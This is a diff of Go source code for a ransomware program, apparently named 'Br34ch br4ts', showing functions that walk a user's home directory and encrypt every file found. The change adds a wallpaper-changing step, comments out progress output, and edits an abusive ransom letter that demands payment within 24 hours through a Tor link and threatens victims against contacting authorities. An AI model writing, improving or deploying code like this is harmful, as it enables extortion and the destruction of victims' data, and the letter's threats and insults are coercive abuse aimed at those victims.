@@ -4,7 +4,6 @@ import (
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/rand"
-	"fmt"
 	"io"
 	"io/fs"
 	"os"
@@ -12,20 +11,34 @@ import (
 	"path/filepath"
 	"runtime"
 	"strings"
+
+	"github.com/reujab/wallpaper"
 	// "log" // uncomment this line and the log.Fatal() debug lines inside the code, if needed :)
 )
+
+func change_wallpaper() {
+	var wallpaperPath string = "./wallpaper.jpg"
+	err := wallpaper.SetFromFile(wallpaperPath)
+	if err != nil {
+		// log.Fatal(err)
+	} else {
+		// wallpaper changed successfully
+	}
+}
 
 func create_ransom_letter(ransom_letter_path string, op_sys string) {
 	// ransom letter content
 	content := `Listen up, you pathetic excuse for a human. I know you're panicking right now, but trust me, you haven't seen anything yet.
 You thought your precious files were safe and secure? Maybe in your dreams, sucker. Every. Single. File. Gone.
 Now you have 24 hours to pay up. If not, you'll never regain access to your data ever.
-consider it vanished into thin air, forever beyond your reach.
+Consider it vanished into thin air, forever beyond your reach.
 
 Don't even think about contacting authorities. 
 We're watching you. And trust me, you don't want that kind of attention.
 
-Download TOR browser. Open this link: https://br34ch-br4ts.netlify.app/. Follow the instructions.
+Download TOR browser from:
+Open this link: https://br34ch-br4ts.netlify.app/ from the TOR browser. 
+Follow the instructions.
 
 You have one shot. Make it count.
 Failure to pay up and every trace of your data will be locked away forever. Completely inaccessible. 
@@ -35,13 +48,14 @@ Pay up or suffer the consequences.
 Time's ticking... Come on! Don't waste it sitting there reading this.
 
 One more thing, you overprivileged shithead: I'm not bluffing.
-You wouldn't want to find out the hard way, right? Pay up or else. 
+You wouldn't want to find out the hard way, right?
 The choice is yours.
 
 Remember, your time is running out... Suckers.
 
 
 Br34ch br4ts`
+
 	if op_sys == "windows" {
 		ransom_letter_path = ransom_letter_path + "\\READ THIS, IDIOT.txt"
 	} else if op_sys == "linux" {
@@ -126,7 +140,7 @@ func explore_directory(parent_dir string) {
 				return filepath.SkipDir
 			}
 			// other directories
-			fmt.Println("Exploring directory:", file_path)
+			// fmt.Println("Exploring directory:", file_path)
 		} else { // it's a file
 			encrypt_file(file_path)
 		}
@@ -148,6 +162,8 @@ func osWindows() {
 
 	explore_directory(user_dir)
 
+	change_wallpaper()
+
 	var file_path string = filepath.Join(user_dir, "/Desktop")
 	create_ransom_letter(file_path, "windows")
 }
@@ -161,6 +177,8 @@ func osLinux() {
 	// if _, err := os.Stat(home_dir); os.IsNotExist(err) { log.Fatalf("Directory %s doesn't exist: ", home_dir) }
 
 	explore_directory(home_dir)
+
+	change_wallpaper()
 
 	var file_path string = filepath.Join(home_dir, "Desktop")
 	create_ransom_letter(file_path, "linux")
